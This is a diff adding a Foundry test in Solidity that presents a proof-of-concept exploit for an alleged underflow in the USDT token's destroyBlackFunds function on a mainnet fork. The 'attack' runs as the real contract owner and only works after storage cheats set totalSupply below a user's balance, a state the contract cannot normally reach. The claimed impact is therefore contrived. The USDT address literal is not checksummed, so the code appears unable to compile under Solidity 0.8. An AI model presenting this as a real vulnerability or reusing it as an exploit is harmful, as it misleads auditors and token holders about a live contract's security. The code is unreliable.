@@ -1,0 +1,70 @@
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import "forge-std/Test.sol";
+
+interface ITetherToken {
+    function owner() external view returns (address);
+    function totalSupply() external view returns (uint);
+    function balanceOf(address who) external view returns (uint);
+    function addBlackList(address _evilUser) external;
+    function destroyBlackFunds(address _blackListedUser) external;
+    function isBlackListed(address) external view returns (bool);
+}
+
+contract ExploitTest is Test {
+    ITetherToken constant USDT = ITetherToken(0xdac17f958d2ee523a2206206994597c13d831ec7);
+
+    address constant BLACKLISTED_USER = address(0xbeef);
+    address attacker;
+
+    function setUp() public {
+        // Label main addresses
+        vm.label(address(USDT), "USDT");
+        vm.label(BLACKLISTED_USER, "BlacklistedUser");
+
+        // Retrieve the actual owner of USDT
+        attacker = USDT.owner();
+        vm.label(attacker, "Owner");
+
+        // Ensure we are on a mainnet fork
+        assertEq(block.chainid, 1);
+    }
+
+    function testUnderflowInDestroyBlackFunds() public {
+        // Step 1: Add a user to blacklist (owner only)
+        vm.prank(attacker);
+        USDT.addBlackList(BLACKLISTED_USER);
+        assertTrue(USDT.isBlackListed(BLACKLISTED_USER));
+
+        // Step 2: Manipulate storage to create the underflow scenario
+        // Set _totalSupply to a very small value (slot 2)
+        vm.store(address(USDT), bytes32(uint256(2)), bytes32(uint256(1)));
+        // Set balance of blacklisted user to a large number (slot 3 for balances mapping)
+        // Slot for balances[addr] = keccak256(abi.encode(addr, 3))
+        bytes32 balanceSlot = keccak256(abi.encode(BLACKLISTED_USER, uint256(3)));
+        vm.store(address(USDT), balanceSlot, bytes32(uint256(100)));
+
+        // Verify pre-conditions
+        assertEq(USDT.balanceOf(BLACKLISTED_USER), 100);
+        assertEq(USDT.totalSupply(), 1);  // manipulated
+
+        // Step 3: As owner, call destroyBlackFunds (no SafeMath – unchecked subtraction)
+        vm.prank(attacker);
+        USDT.destroyBlackFunds(BLACKLISTED_USER);
+
+        // Step 4: Assert the impact – totalSupply underflows to a huge number
+        uint256 newTotalSupply = USDT.totalSupply();
+        // 1 - 100 underflows to 2^256 - 99
+        uint256 expected = type(uint256).max - 99;
+        assertEq(newTotalSupply, expected, "totalSupply should underflow to 2^256-99");
+
+        // Also the blacklisted user's balance is zeroed
+        assertEq(USDT.balanceOf(BLACKLISTED_USER), 0);
+
+        // Demonstrate that the underflow is harmful: totalSupply is now astronomically large
+        assertTrue(newTotalSupply > 10**30, "Total supply inflated by underflow");
+    }
+}
+```
